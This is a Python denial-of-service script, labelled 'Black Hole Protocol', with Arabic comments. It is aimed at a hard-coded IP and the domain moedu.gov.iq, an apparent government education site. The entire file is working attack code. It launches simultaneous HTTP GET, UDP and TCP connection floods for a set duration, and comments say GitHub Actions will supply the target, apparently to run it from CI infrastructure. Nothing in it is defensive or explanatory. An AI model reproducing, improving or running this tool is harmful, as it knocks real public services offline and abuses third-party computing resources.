# Black Hole - Brute Force Attack Protocol (v2)
# Coded for maximum impact. No mercy.
import asyncio
import socket
import random
import time

# --- الإعدادات الرئيسية ---
TARGET_IP = "63.246.154.12"  # سيتم استبداله بواسطة GitHub Actions
DURATION = 600               # سيتم استبداله بواسطة GitHub Actions
TARGET_DOMAIN = "moedu.gov.iq"

# --- الرسائل الملونة للطباعة ---
class Color:
    RESET = '\033[0m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'

def print_attack(message):
    print(f"{Color.RED}[ATTACK] {message}{Color.RESET}")

# --- النواقل الهجومية ---

# 1. ناقل HTTP Flood (L7) - يستهلك CPU والذاكرة
async def http_flood_vector():
    while True:
        try:
            reader, writer = await asyncio.open_connection(TARGET_IP, 80)
            request = (
                f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\n"
                f"Host: {TARGET_DOMAIN}\r\n"
                f"User-Agent: {random.randint(1, 99999)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            writer.write(request.encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        await asyncio.sleep(0.001) # إطلاق الطلبات بأسرع ما يمكن

# 2. ناقل UDP Flood (L4) - يستهلك عرض النطاق الترددي
async def udp_flood_vector():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, random.randint(1, 65535)))
        except Exception:
            pass
        await asyncio.sleep(0.001)

# 3. ناقل SYN Flood (L4) - يستهلك جدول اتصالات الخادم
async def syn_flood_vector():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.setblocking(False)
                await asyncio.get_event_loop().sock_connect(sock, (TARGET_IP, random.choice([80, 443])))
        except Exception:
            pass
        await asyncio.sleep(0.001)

# --- المنسق الرئيسي ---
async def main():
    print("="*60)
    print(f"{Color.YELLOW}         Black Hole Protocol Engaged - Maximum Damage Mode{Color.RESET}")
    print("="*60)
    print_attack(f"Target Acquired: {TARGET_IP}")
    print_attack(f"Attack Duration: {DURATION} seconds")
    print_attack("Unleashing Tri-Layer Attack Vectors. All safeties disabled.")
    
    # تشغيل جميع النواقل الهجومية الثلاثة في نفس الوقت
    attack_task = asyncio.gather(
        http_flood_vector(),
        udp_flood_vector(),
        syn_flood_vector()
    )
    
    # تشغيل الهجوم للمدة المحددة ثم إيقافه
    await asyncio.sleep(DURATION)
    attack_task.cancel()
    
    print(f"{Color.GREEN}[SUCCESS] Attack cycle complete. Black Hole disengaged.{Color.RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, asyncio.CancelledError):
        print(f"{Color.YELLOW}\nBlack Hole disengaged manually or cycle ended.{Color.RESET}")
